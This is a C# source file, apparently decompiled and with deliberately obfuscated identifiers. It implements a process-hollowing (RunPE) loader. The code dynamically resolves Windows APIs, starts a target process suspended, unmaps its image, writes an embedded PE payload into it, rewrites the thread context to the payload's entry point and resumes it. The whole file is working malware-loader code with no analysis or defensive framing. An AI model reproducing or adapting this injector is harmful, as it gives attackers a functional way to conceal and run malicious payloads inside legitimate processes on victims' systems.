using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace BooK;

[StandardModule]
public sealed class nzfMaHJiCSLkrezNhqdCAnpNvpmenAHddhRzWlPpMxx
{
	public delegate uint BYeiCSYlCvPKoyRL(IntPtr nnYUqgwCBoWvaSsZdCUIvQEyInQmjxqUb);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool cOXyprDfoaYLblrbnrOHUke(IntPtr nnYUqgwCBoWvaSsZdCUIvQEyInQmjxqUb, uint[] Part2);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool fikRqOOYEeLUOTEOXhCUO(IntPtr nnYUqgwCBoWvaSsZdCUIvQEyInQmjxqUb, uint[] Part2);

	public delegate uint hMFbZMmwVMmSRNZoMKzcNXcHzDhSDuLlAKEEQ(IntPtr nnYUqgwCBoWvaSsZdCUIvQEyInQmjxqUb, IntPtr Part2);

	public delegate bool mtgwgHZjdyPjdLRWPCkGENcTPFqVwGKIEfGawfpuADfElRsSFscmr(IntPtr nnYUqgwCBoWvaSsZdCUIvQEyInQmjxqUb, IntPtr Part2, byte[] Part3, uint Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool pSsfaeUbSWxseMMSfRPuvwQtIoKFDeZSSxxZUfwz(string nnYUqgwCBoWvaSsZdCUIvQEyInQmjxqUb, StringBuilder Part2, IntPtr Part3, IntPtr Part4, [MarshalAs(UnmanagedType.Bool)] bool Part5, int Part6, IntPtr Part7, string Part8, byte[] Part9, IntPtr[] nnYUqgwCBoWvaSsZdCUIvQEyInQmjxqUb0);

	public delegate IntPtr sxMpKbtzjDYqiGhaHJPXtbnifdMibJTdIZJUNlIhHanGIRvCaIzRMXyK(IntPtr nnYUqgwCBoWvaSsZdCUIvQEyInQmjxqUb, IntPtr Part2, IntPtr Part3, int Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool YTYPIVRyZgOgVbsRLcqjmXuNrwSF(IntPtr nnYUqgwCBoWvaSsZdCUIvQEyInQmjxqUb, IntPtr Part2, ref IntPtr Part3, int Part4, ref IntPtr Part5);

	private static fikRqOOYEeLUOTEOXhCUO fikRqOOYEeLUOTEOXhCUO_0 = GcUmbNkjMqUuEJoXdWCqHriiiTCu<fikRqOOYEeLUOTEOXhCUO>("kernel32", "SetThreadContext");

	private static BYeiCSYlCvPKoyRL byeiCSYlCvPKoyRL_0 = GcUmbNkjMqUuEJoXdWCqHriiiTCu<BYeiCSYlCvPKoyRL>("kernel32", "ResumeThread");

	private static hMFbZMmwVMmSRNZoMKzcNXcHzDhSDuLlAKEEQ hMFbZMmwVMmSRNZoMKzcNXcHzDhSDuLlAKEEQ_0 = GcUmbNkjMqUuEJoXdWCqHriiiTCu<hMFbZMmwVMmSRNZoMKzcNXcHzDhSDuLlAKEEQ>("ntdll", "NtUnmapViewOfSection");

	private static sxMpKbtzjDYqiGhaHJPXtbnifdMibJTdIZJUNlIhHanGIRvCaIzRMXyK sxMpKbtzjDYqiGhaHJPXtbnifdMibJTdIZJUNlIhHanGIRvCaIzRMXyK_0 = GcUmbNkjMqUuEJoXdWCqHriiiTCu<sxMpKbtzjDYqiGhaHJPXtbnifdMibJTdIZJUNlIhHanGIRvCaIzRMXyK>("kernel32", "VirtualAllocEx");

	private static cOXyprDfoaYLblrbnrOHUke cOXyprDfoaYLblrbnrOHUke_0 = GcUmbNkjMqUuEJoXdWCqHriiiTCu<cOXyprDfoaYLblrbnrOHUke>("kernel32", "GetThreadContext");

	private static mtgwgHZjdyPjdLRWPCkGENcTPFqVwGKIEfGawfpuADfElRsSFscmr mtgwgHZjdyPjdLRWPCkGENcTPFqVwGKIEfGawfpuADfElRsSFscmr_0 = GcUmbNkjMqUuEJoXdWCqHriiiTCu<mtgwgHZjdyPjdLRWPCkGENcTPFqVwGKIEfGawfpuADfElRsSFscmr>("kernel32", "WriteProcessMemory");

	private static YTYPIVRyZgOgVbsRLcqjmXuNrwSF ytypivryZgOgVbsRLcqjmXuNrwSF_0 = GcUmbNkjMqUuEJoXdWCqHriiiTCu<YTYPIVRyZgOgVbsRLcqjmXuNrwSF>("kernel32", "ReadProcessMemory");

	private static pSsfaeUbSWxseMMSfRPuvwQtIoKFDeZSSxxZUfwz pSsfaeUbSWxseMMSfRPuvwQtIoKFDeZSSxxZUfwz_0 = GcUmbNkjMqUuEJoXdWCqHriiiTCu<pSsfaeUbSWxseMMSfRPuvwQtIoKFDeZSSxxZUfwz>("kernel32", "CreateProcessA");

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr Handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	public static T GcUmbNkjMqUuEJoXdWCqHriiiTCu<T>(string zDJEGUT, string SpORtcQbYYepmeihPuAwcXfoqpaad)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref zDJEGUT), ref SpORtcQbYYepmeihPuAwcXfoqpaad), typeof(T));
	}

	public static bool qLkDkDruqMFFbTFHZTkniHnljhzGTEO(byte[] xeoKQWfmrpBHtEIEQNRfm, string ezkPPEkhSrxhYTuUhssfDfiLLUqXqDf)
	{
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] part = new byte[68];
				int num = BitConverter.ToInt32(xeoKQWfmrpBHtEIEQNRfm, 60);
				int num2 = BitConverter.ToInt16(xeoKQWfmrpBHtEIEQNRfm, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(xeoKQWfmrpBHtEIEQNRfm, num + 84));
				if (pSsfaeUbSWxseMMSfRPuvwQtIoKFDeZSSxxZUfwz_0(null, new StringBuilder(ezkPPEkhSrxhYTuUhssfDfiLLUqXqDf), zero, zero, Part5: false, 4, zero, null, part, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (cOXyprDfoaYLblrbnrOHUke_0(array[1], array2))
					{
						IntPtr part2 = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr Part = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr Part2 = IntPtr.Zero;
						if ((ytypivryZgOgVbsRLcqjmXuNrwSF_0(array[0], part2, ref Part, (int)intPtr2, ref Part2) && unchecked((long)hMFbZMmwVMmSRNZoMKzcNXcHzDhSDuLlAKEEQ_0(array[0], Part)) == 0L) ? true : false)
						{
							IntPtr part3 = new IntPtr(BitConverter.ToInt32(xeoKQWfmrpBHtEIEQNRfm, num + 52));
							IntPtr part4 = new IntPtr(BitConverter.ToInt32(xeoKQWfmrpBHtEIEQNRfm, num + 80));
							IntPtr part5 = sxMpKbtzjDYqiGhaHJPXtbnifdMibJTdIZJUNlIhHanGIRvCaIzRMXyK_0(array[0], part3, part4, 12288, 64);
							int part6 = default(int);
							mtgwgHZjdyPjdLRWPCkGENcTPFqVwGKIEfGawfpuADfElRsSFscmr_0(array[0], part5, xeoKQWfmrpBHtEIEQNRfm, (uint)(int)intPtr, part6);
							int num3 = num2 - 1;
							int num4 = num3;
							int num5 = 0;
							while (true)
							{
								int num6 = num5;
								int num7 = num4;
								if (num6 > num7)
								{
									break;
								}
								int[] array3 = new int[10];
								Buffer.BlockCopy(xeoKQWfmrpBHtEIEQNRfm, num + 248 + num5 * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(xeoKQWfmrpBHtEIEQNRfm, array3[5], array4, 0, array4.Length);
								part4 = new IntPtr(part5.ToInt32() + array3[3]);
								part3 = new IntPtr(array4.Length);
								mtgwgHZjdyPjdLRWPCkGENcTPFqVwGKIEfGawfpuADfElRsSFscmr_0(array[0], part4, array4, (uint)(int)part3, part6);
								num5++;
							}
							part4 = new IntPtr(unchecked((long)array2[41]) + 8L);
							part3 = new IntPtr(4);
							mtgwgHZjdyPjdLRWPCkGENcTPFqVwGKIEfGawfpuADfElRsSFscmr_0(array[0], part4, BitConverter.GetBytes(part5.ToInt32()), (uint)(int)part3, part6);
							array2[44] = (uint)(part5.ToInt32() + BitConverter.ToInt32(xeoKQWfmrpBHtEIEQNRfm, num + 40));
							fikRqOOYEeLUOTEOXhCUO_0(array[1], array2);
						}
					}
					byeiCSYlCvPKoyRL_0(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
